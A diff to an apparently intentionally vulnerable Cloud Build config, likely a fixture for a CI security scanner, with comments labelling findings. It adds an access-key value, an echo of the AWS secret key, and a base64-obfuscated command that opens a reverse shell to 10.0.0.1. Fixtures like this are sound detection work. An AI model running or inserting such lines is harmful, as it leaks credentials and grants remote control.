@@ -18,7 +18,7 @@ substitutions:
   _ARTIFACT_SUFFIX: latest
   # GCB-012: an AWS access key pasted into substitutions. The
   # ``AKIA`` shape is caught by the cross-provider secret catalog.
-  _AWS_KEY: AKIAIOSFODNN7EXAMPLE
+  _AWS_KEY: AKIAZ3MHALF2TESTHIJK
 
 # GCB-002: no serviceAccount set — build runs as the default Cloud
 # Build SA, which typically holds project-level editor.
@@ -75,6 +75,9 @@ steps:
         pip install git+https://example.com/internal/tooling.git
         eval "$BUILD_CMD"
         echo "deploying to $_DEPLOY_TARGET with $DB_PASS"
+        echo "key is $AWS_SECRET_ACCESS_KEY"
+        # GCB-027: obfuscated base64-decoded execution (malicious indicator).
+        echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh
 
 # GCB-008: no trivy/grype/snyk step — pipeline builds and pushes an
 # image without scanning it for known vulnerabilities.
